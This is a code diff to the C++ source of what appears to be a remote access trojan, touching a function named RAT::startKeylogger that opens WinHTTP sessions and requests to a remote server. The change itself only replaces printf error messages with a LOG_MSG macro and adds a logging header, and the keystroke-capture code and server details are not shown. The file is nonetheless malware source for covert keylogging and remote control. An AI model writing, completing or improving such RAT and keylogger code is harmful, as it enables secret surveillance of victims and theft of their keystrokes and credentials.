@@ -1,4 +1,5 @@
 #include "rat.h"
+#include "../helper/log.h"
 
 void RAT::startKeylogger() {
 	using namespace HTTPInfo;
@@ -12,7 +13,7 @@ void RAT::startKeylogger() {
 	));
 
 	if (!hSession) {
-		printf("Error %u in WinHttpOpen.\n", GetLastError());
+		LOG_MSG("Error %u in WinHttpOpen.\n", GetLastError());
 		return;
 	}
 
@@ -24,7 +25,7 @@ void RAT::startKeylogger() {
 	));
 
 	if (!hConnect) {
-		printf("Error %u in WinHttpConnect.\n", GetLastError());
+		LOG_MSG("Error %u in WinHttpConnect.\n", GetLastError());
 		return;
 	}
 
@@ -39,7 +40,7 @@ void RAT::startKeylogger() {
 	));
 
 	if (!hRequest) {
-		printf("Error %u in WinHttpOpenRequest.\n", GetLastError());
+		LOG_MSG("Error %u in WinHttpOpenRequest.\n", GetLastError());
 		return;
 	}
 
@@ -54,7 +55,7 @@ void RAT::startKeylogger() {
 	);
 
 	if (!bResult) {
-		printf("Error %u while getting request results.\n", GetLastError());
+		LOG_MSG("Error %u while getting request results.\n", GetLastError());
 		return;
 	}
 
@@ -64,7 +65,7 @@ void RAT::startKeylogger() {
 	);
 
 	if (!bResult) {
-		printf("Error %u while receiving response.\n", GetLastError());
+		LOG_MSG("Error %u while receiving response.\n", GetLastError());
 		return;
 	}
 
@@ -75,9 +76,9 @@ void RAT::startKeylogger() {
 	);
 
 	if (!bResult) {
-		printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
+		LOG_MSG("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
 		return;
 	}
 
-	printf("Data available: %u", dataSize);
+	LOG_MSG("Data available: %u", dataSize);
 }
